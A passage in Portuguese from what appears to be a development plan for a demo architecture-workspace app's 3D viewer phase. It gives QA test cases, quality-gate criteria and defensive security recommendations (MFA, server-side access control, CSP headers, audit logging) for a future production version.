| **QA-12** | **Responsividade Mobile (`375px`), Tablet (`768px`) e Desktop (`1440px+`)** | Inspecção da vista do modelo e do dossier em `375x812`, `768x1024` e `1440x900`. | Sem *overflow* horizontal indesejado; controlos do visualizador e metadados permanecem legíveis e accionáveis (alvos de toque adequados em mobile/tablet); grelha técnica equilibrada em desktop. |
| **QA-13** | **Compatibilidade Bilingue PT/EN e Movimento Reduzido** | Alternar entre `PT` e `EN` no cabeçalho com o visualizador em estado vazio, com `.glb` carregado, com `.skp` registado e em estado de erro; activar Movimento Reduzido. | 100% dos rótulos, avisos de erro, estados de acessibilidade (`aria-label`) e notas de limitação demonstrativa mudam imediatamente de idioma sem chaves em falta nem termos misturados. Nenhuma rotação automática ocorre com Movimento Reduzido activo. |

---

## 6. Critérios de Aprovação Pós-Integração (Quality Gate da Fase 04)

Para que a integração final da Fase 04 seja aprovada na revisão conjunta (após conclusão dos Agentes A e B), **todos** os critérios abaixo têm de estar verificados:

1. **Build, Tipagem e Testes Automatizados:**
   - `npm run typecheck` passa com 0 erros TypeScript.
   - `npm test` (Vitest) passa a 100%, incluindo novos testes unitários e de integração cobrindo os cenários `QA-01` a `QA-13`.
   - `npm run build` conclui sem erros de empacotamento.
2. **Segurança e Privacidade Verificadas (Zero P0 abertos):**
   - Nenhum ficheiro `.gltf` pode desencadear pedidos HTTP/HTTPS ou leitura de caminhos relativos externos.
   - Nenhuma chave de `localStorage` contém binários Base64 de modelos 3D nem URLs `blob:`.
   - `resetAllDemoData()` em `/workspace/settings` limpa também qualquer estado persistido introduzido na Fase 04 e revoga eventuais `ObjectURLs` activos na sessão.
   - Todos os projectos criados localmente permanecem com `publicationStatus = 'private'`.
3. **Gestão de Memória e Estabilidade Gráfica:**
   - Paridade 1:1 entre `URL.createObjectURL` e `URL.revokeObjectURL` ao substituir modelos ou desmontar a vista.
   - Libertação explícita de recursos WebGL (`dispose()`) confirmada no ciclo de vida do componente.
   - *Error Boundary* e fallback de `webglcontextlost` operacionais sem afectar a `WorkspaceShell`.
4. **Acessibilidade e Honestidade Operacional:**
   - Navegação completa por teclado sem *trap* no `<canvas>`, com controlos explícitos de reposição/vista e anúncios `aria-live`.
   - Distinção clara e honesta em PT e EN entre ficheiros `.glb`/`.gltf` (renderizáveis no navegador) e `.skp` (fonte nativa registada sem conversão no cliente), bem como entre ficheiros estáticos de demonstração e ficheiros locais temporários da sessão actual.
5. **Isolamento do Website Público:**
   - Zero alterações em `main`, SEO ou no repositório do website público `oaworkshop`.

---

## 7. Recomendações de Protecção Antes de Introduzir Dados Reais (Futuro Pós-Demo)

Quando o **O+A Workspace** evoluir do actual modo demonstrativo local para uma plataforma de produção ligada a servidores e projectos reais do atelier, deverão ser implementados os seguintes controlos de arquitectura e segurança antes de carregar qualquer projecto ou modelo confidencial de clientes:

1. **Autenticação Forte e Controlo de Acessos Baseado em Papéis (RBAC) no Servidor:**
   - Substituir a selecção demonstrativa de papéis por autenticação federada (OIDC / SAML 2.0 com MFA obrigatório) e sessões geridas por cookies `HttpOnly; Secure; SameSite=Strict`.
   - Aplicar autorização (RBAC e controlo ao nível do objecto/projecto — ABAC) **exclusivamente no backend/API**, garantindo que estados `private`, revisões internas e aprovações editoriais de `director` / `communications` não dependam de validações no cliente.
2. **Pipeline Segura de Upload, Armazenamento e Sanitização de Ficheiros 3D/CAD:**
   - Armazenar ficheiros `.skp`, `.glb`, `.gltf`, `.ifc`, `.dwg` e `.pdf` em *object storage* privado e cifrado em repouso (AES-256 / KMS), acessível apenas através de *Pre-Signed URLs* de curta duração e ligados à sessão autenticada.
   - Executar validação e conversão em *sandbox* isolada no servidor (antivírus, verificação de *magic bytes*, remoção de metadados EXIF/autorais sensíveis e conversão controlada de `.gltf` para `.glb` auto-contido e optimizado).
3. **Content Security Policy (CSP) e Isolamento de Origem:**
   - Configurar cabeçalhos HTTP estritos na aplicação de produção:
     - `Content-Security-Policy`: restringir `connect-src 'self' https://storage.oa-workspace-internal...`, `object-src 'none'`, `base-uri 'self'`, `frame-ancestors 'none'`, permitindo `blob:` apenas onde estritamente necessário (`img-src 'self' blob: data:`).
     - `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer` (para evitar fuga de códigos/IDs de projectos privados em cabeçalhos `Referer`).
4. **Classificação de Dados, Retenção e Registo de Auditoria (*Audit Trail*):**
   - Eliminar o uso de `localStorage` para metadados de projectos ou estados de revisão, mantendo no cliente apenas preferências visuais anónimas (idioma, tema, movimento reduzido).
   - Registar em *audit log* imutável no servidor todas as operações de criação de projecto, upload/download de modelos 3D, alterações de estado de revisão e qualquer transição de `publicationStatus` de `private` para publicação externa em `oa-workshop.com`.
